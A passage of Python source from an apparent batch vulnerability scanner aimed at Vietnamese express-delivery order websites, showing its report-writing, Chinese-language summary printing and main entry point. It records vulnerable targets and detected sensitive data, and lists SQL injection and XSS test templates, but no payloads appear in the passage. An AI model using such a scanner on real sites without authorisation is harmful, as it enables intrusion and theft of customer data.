                'time_zone': 'GMT+7',
                'encoding': 'utf-8',
                'ai_enabled': DVPPF_AVAILABLE,
                'loader_status': 'enabled' if self.dvppf_loader else 'disabled'
            },
            'scan_summary': {
                'total_targets': len(self.targets),
                'completed': len([r for r in self.results if r.status == 'completed']),
                'vulnerable': len([r for r in self.results if r.status == 'vulnerable']),
                'failed': len([r for r in self.results if r.status == 'failed']),
                'scan_time': datetime.now().isoformat(),
                'ai_analyses': len([r for r in self.results if r.ai_analysis])
            },
            'target_results': [
                {
                    'name': result.target.name,
                    'url': result.target.url,
                    'status': result.status,
                    'response_time': result.response_time,
                    'vulnerabilities': result.vulnerabilities,
                    'technologies': result.technologies,
                    'sensitive_data': result.sensitive_data,
                    'recommendations': result.recommendations,
                    'scan_time': result.scan_time.isoformat(),
                    'ai_analysis': result.ai_analysis[:500] + '...' if len(result.ai_analysis) > 500 else result.ai_analysis
                }
                for result in self.results
            ],
            'vietnam_specific_features': {
                'business_hours': self.vietnam_config['business_hours'],
                'language_support': 'vi',
                'local_patterns': list(self.vietnam_config['common_patterns'].keys()),
                'business_logic': self.vietnam_config['business_logic'],
                'vulnerability_templates': ['越南语SQL注入', '越南语XSS', '越南语业务逻辑']
            }
        }

        with open(report_file, 'w', encoding='utf-8') as f:
            json.dump(report_data, f, ensure_ascii=False, indent=2)

        print(f"[DVPPF] 增强扫描报告已生成: {report_file}")

        # 打印DVPPF摘要
        self._print_dvppf_summary()

    def _print_dvppf_summary(self) -> None:
        """打印DVPPF增强摘要"""
        print("\n" + "="*70)
        print("DVPPF框架越南快递订单网站批量扫描摘要")
        print("="*70)

        total = len(self.targets)
        completed = len([r for r in self.results if r.status == 'completed'])
        vulnerable = len([r for r in self.results if r.status == 'vulnerable'])
        failed = len([r for r in self.results if r.status == 'failed'])
        ai_analyses = len([r for r in self.results if r.ai_analysis])

        print(f"总目标数: {total}")
        print(f"扫描完成: {completed}")
        print(f"发现漏洞: {vulnerable}")
        print(f"扫描失败: {failed}")
        print(f"AI分析数: {ai_analyses}")

        print(f"\n[DVPPF框架状态]")
        print(f"框架版本: 2.0")
        print(f"地区优化: 越南 (GMT+7)")
        print(f"AI协作: {'✓ 启用' if DVPPF_AVAILABLE else '✗ 未启用'}")
        print(f"智能分析: {'✓ 已启用' if self.dvppf_loader else '✗ 未启用'}")

        if vulnerable > 0:
            print("\n[发现漏洞的目标:]")
            for result in self.results:
                if result.status == 'vulnerable':
                    print(f"- {result.target.name}: {len(result.vulnerabilities)} 个漏洞")
                    if result.ai_analysis:
                        print(f"  * AI分析: {result.ai_analysis[:100]}...")
                    for vuln in result.vulnerabilities[:3]:
                        print(f"  * {vuln}")

        print("\n[越南地区特性]")
        print("- ✓ 越南语字符集优化")
        print("- ✓ 越南业务逻辑适配")
        print("- ✓ 越南敏感数据检测")
        print("- ✓ 本地化漏洞测试")
        print("- ✓ 时区和工作时间优化")

        print("="*70)

def main():
    """主函数"""
    print("Dragon-V Prompt & Policy Framework - 越南快递订单网站扫描器")
    print("DVPPF Vietnamese Express Order System Scanner v2.0")
    print("="*70)

    # 初始化扫描器
    scanner = DVPPFVietnameseScanner()

    # 加载目标
    scanner.load_targets()

    if not scanner.targets:
        print("[ERROR] 没有可用的扫描目标")
        return

    # 执行批量扫描
    scanner.batch_scan(max_workers=3)

if __name__ == "__main__":
    main()